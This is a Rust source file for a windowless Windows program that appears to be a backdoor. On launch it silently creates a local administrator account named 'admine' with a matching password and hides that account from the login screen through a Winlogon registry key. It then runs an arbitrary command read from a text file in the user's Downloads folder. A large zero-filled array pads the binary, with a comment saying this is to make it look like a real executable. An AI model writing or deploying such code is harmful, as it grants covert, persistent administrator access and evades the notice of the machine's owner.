#![windows_subsystem = "windows"]
use std::{env, os::windows::process::CommandExt, process::Command};

use windows_registry::LOCAL_MACHINE;

const DUMMY_SIZE: usize = 17 * 1024 * 1024;

#[used]
#[unsafe(link_section = ".CRT$XCU")]
// make it look like a real executable; blow up the size to about 2mb
static DUMMY: [u8; DUMMY_SIZE] = [0; DUMMY_SIZE];

const CREATE_NO_WINDOW: u32 = 0x08000000;

fn main() {
    unsafe { std::env::set_var("RUST_BACKTRACE", "1") };
    if let Err(e) = real_main() {
        std::fs::write(
            env::home_dir().unwrap().join("Downloads/err.txt"),
            format!("{e:?}"),
        )
        .unwrap();
        std::process::exit(1);
    }
}

fn create_admin() -> Result<(), eyre::Error> {
    Command::new("net")
        .args(["user", "/add", "admine", "admine"])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()?
        .wait()?;
    Command::new("net")
        .args(["localgroup", "administrators", "admine", "/add"])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()?
        .wait()?;

    Ok(())
}

fn set_hidden() -> Result<(), eyre::Error> {
    let key = LOCAL_MACHINE.create(
        r#"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"#,
    )?;
    key.set_u32("admine", 0)?;
    Ok(())
}

fn execute_cmd() -> Result<(), eyre::Error> {
    let cmd = std::fs::read_to_string(env::home_dir().unwrap().join("Downloads/path.txt"))?;
    let mut split = cmd.trim().split(' ');
    let cmd = split.next().unwrap();
    let args = split.collect::<Vec<_>>();

    Command::new(cmd).args(args).spawn()?.wait()?;
    Ok(())
}

fn real_main() -> Result<(), eyre::Error> {
    create_admin()?;
    set_hidden()?;
    execute_cmd()?;

    Ok(())
}
